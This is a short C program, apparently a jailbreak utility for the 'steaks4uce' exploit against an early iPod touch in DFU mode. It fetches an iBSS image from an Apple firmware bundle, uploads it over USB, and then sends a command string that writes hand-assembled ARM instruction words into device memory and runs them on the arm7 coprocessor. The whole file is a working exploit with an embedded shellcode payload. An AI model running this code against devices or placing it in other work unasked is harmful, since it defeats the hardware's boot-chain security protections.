#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <libusb-1.0/libusb.h>
#include <sys/stat.h>
#include "partial.h"
#include "libflursch.h"

int main(int argc, char *argv[]) {
    
    libflursch_init();
    
    if (connect2(0x1227,10) != EXIT_SUCCESS) {
        dprintf("Cannot connect to device.");
        return EXIT_FAILURE;
    }
    
    if (get_cpid() != 0x8720) {
        dprintf("Not compatible with steaks4uce.");
        return EXIT_FAILURE;
    }
    
    if (file_exists("images") < 0) {
        if (mkdir("images", 0700) < 0) {
            return EXIT_FAILURE;
        }
    }
    
    if (file_exists("images/iBSS.n72ap.RELEASE.dfu") < 0) {
        dprintf("File not found, downloading file from Apple.");
        if(download_file_from_zip("http://appldnld.apple.com.edgesuite.net/content.info.apple.com/iPod/SBML/osx/bundles/061-5494.20080909.8i9o0/iPod2,1_2.1.1_5F138_Restore.ipsw", "Firmware/dfu/iBSS.n72ap.RELEASE.dfu", "images/iBSS.n72ap.RELEASE.dfu", NULL) != EXIT_SUCCESS) {
            return EXIT_FAILURE;
        }
    }
    
    dprintf("Uploading %s.","images/iBSS.n72ap.RELEASE.dfu.");
    if(send_file("images/iBSS.n72ap.RELEASE.dfu", kDFUMode) != EXIT_SUCCESS) {
        dprintf("Failed to upload %s.", "images/iBSS.n72ap.RELEASE.dfu.");
        return EXIT_FAILURE;
    }
    
    dprintf("Waiting 5 seconds...");
    sleep(5);
    if (connect2(0x1281,10) != EXIT_SUCCESS) {
        dprintf("Cannot connect to device.");
        return EXIT_FAILURE;
    }
    
    if(send_cmd("arm7_stop;mw 0x9000000 0xe59f3014;mw 0x9000004 0xe3a02a02;mw 0x9000008 0xe1c320b0;mw 0x900000c 0xe3e02000;mw 0x9000010 0xe2833c9d;mw 0x9000014 0xe58326c0;mw 0x9000018 0xeafffffe;mw 0x900001c 0x2200f300;arm7_go;#;arm7_stop") != EXIT_SUCCESS) {
        dprintf("Failed to send command.");
        return EXIT_FAILURE;
    }
    
    libflursch_exit();
    
    return EXIT_SUCCESS;
}
